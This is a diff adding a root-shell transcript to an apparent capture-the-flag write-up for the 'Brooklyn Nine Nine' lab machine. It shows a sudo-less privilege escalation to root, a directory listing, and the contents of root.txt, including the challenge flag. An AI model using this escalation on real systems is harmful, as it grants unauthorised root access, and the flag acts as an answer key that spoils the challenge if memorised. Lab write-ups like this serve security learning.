@@ -157,6 +157,54 @@ User jake may run the following commands on brookly_nine_nine:
 
 
 
+<pre><code>
+$ jake@brookly_nine_nine:~$ sudo less /etc/profile
+# pwd
+/home/jake
+# cd /
+# ls -la
+total 100
+drwxr-xr-x  24 root root  4096 May 19  2020 .
+drwxr-xr-x  24 root root  4096 May 19  2020 ..
+drwxr-xr-x   2 root root  4096 May 17  2020 bin
+drwxr-xr-x   3 root root  4096 May 19  2020 boot
+drwxr-xr-x   2 root root  4096 May 17  2020 cdrom
+drwxr-xr-x  17 root root  3700 Oct 30 03:45 dev
+drwxr-xr-x  93 root root  4096 May 26  2020 etc
+drwxr-xr-x   5 root root  4096 May 18  2020 home
+lrwxrwxrwx   1 root root    34 May 19  2020 initrd.img -> boot/initrd.img-4.15.0-101-generic
+lrwxrwxrwx   1 root root    33 May 17  2020 initrd.img.old -> boot/initrd.img-4.15.0-99-generic
+drwxr-xr-x  22 root root  4096 May 18  2020 lib
+drwxr-xr-x   2 root root  4096 Feb  3  2020 lib64
+drwx------   2 root root 16384 May 17  2020 lost+found
+drwxr-xr-x   2 root root  4096 Feb  3  2020 media
+drwxr-xr-x   2 root root  4096 Feb  3  2020 mnt
+drwxr-xr-x   2 root root  4096 Feb  3  2020 opt
+dr-xr-xr-x 104 root root     0 Oct 30 03:45 proc
+drwx------   4 root root  4096 May 18  2020 root
+drwxr-xr-x  27 root root   880 Oct 30 03:45 run
+drwxr-xr-x   2 root root 12288 May 17  2020 sbin
+drwxr-xr-x   4 root root  4096 May 17  2020 snap
+drwxr-xr-x   3 root root  4096 May 17  2020 srv
+dr-xr-xr-x  13 root root     0 Oct 30 03:45 sys
+drwxrwxrwt  10 root root  4096 Oct 30 03:46 tmp
+drwxr-xr-x  10 root root  4096 Feb  3  2020 usr
+drwxr-xr-x  15 root root  4096 May 17  2020 var
+lrwxrwxrwx   1 root root    31 May 19  2020 vmlinuz -> boot/vmlinuz-4.15.0-101-generic
+lrwxrwxrwx   1 root root    30 May 17  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-99-generic
+# cd root
+# ls
+root.txt
+# cat root.txt
+-- Creator : Fsociety2006 --
+Congratulations in rooting Brooklyn Nine Nine
+Here is the flag: 63a9f0ea7bb98050796b649e85481845
+
+Enjoy!!
+</code></pre>
+
+
+
 
 
 
